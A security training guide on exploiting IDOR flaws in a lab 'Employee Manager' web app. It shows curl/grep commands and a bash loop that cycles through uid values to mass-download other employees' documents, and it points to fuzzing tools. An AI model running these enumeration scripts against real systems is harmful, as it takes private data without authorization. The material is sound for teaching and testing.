# Mass IDOR Enumeration

Exploiting Insecure Direct Object References (IDOR) vulnerabilities can range from straightforward to complex, depending on the web application's design and access control mechanisms. This guide outlines various techniques for exploiting IDOR vulnerabilities, from basic enumeration to mass data gathering and user privilege escalation.

**Understanding Insecure Parameters**

To illustrate a typical IDOR vulnerability, consider an Employee Manager web application that allows users to access their documents. The application URL might look like this:

```
http://SERVER_IP:PORT/documents.php?uid=1
```

In this scenario, the `uid` parameter is used to display documents associated with a specific employee. If the application lacks proper access control, changing the `uid` value could allow unauthorized access to other employees' documents.

For example, if you change the URL to:

```
http://SERVER_IP:PORT/documents.php?uid=2
```

You might still see the same document list, but upon inspecting the links, you could find that they actually point to documents belonging to the employee with `uid=2`, indicating a classic IDOR vulnerability.

**Mass Enumeration Techniques**

While manually testing each `uid` is possible, it is inefficient for applications with many users. Instead, you can automate the process using tools or scripts.

1.  **Using Curl and Grep** You can use `curl` to fetch the document page and `grep` to extract document links. For instance:

    {% code overflow="wrap" %}
    ```bash
    curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"
    ```
    {% endcode %}

    This command retrieves the HTML content and filters for document links.
2.  **Regex for Document Links** To refine the output, you can use a regex pattern to extract only the document links:

    {% code overflow="wrap" %}
    ```bash
    curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
    ```
    {% endcode %}

    This command will return only the relevant document links.
3.  **Bash Script for Mass Downloading** You can create a simple Bash script to loop through multiple `uid` values and download all documents:

    {% code overflow="wrap" %}
    ```bash
    #!/bin/bash

    url="http://SERVER_IP:PORT"

    for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
            wget -q $url/$link
        done
    done
    ```
    {% endcode %}

    This script will download documents for all employees with `uid` values from 1 to 10, effectively exploiting the IDOR vulnerability.

**Advanced Techniques**

For more sophisticated IDOR attacks, understanding how the web application calculates object references and its access control mechanisms is crucial. Here are some advanced techniques:

* **Comparing User Roles**: Register multiple user accounts to compare their HTTP requests and object references. This can help you understand how parameters are generated and potentially exploit them for unauthorized access.
* **Fuzzing Tools**: Utilize tools like Burp Intruder or ZAP Fuzzer to automate the process of testing various `uid` values and retrieving documents.
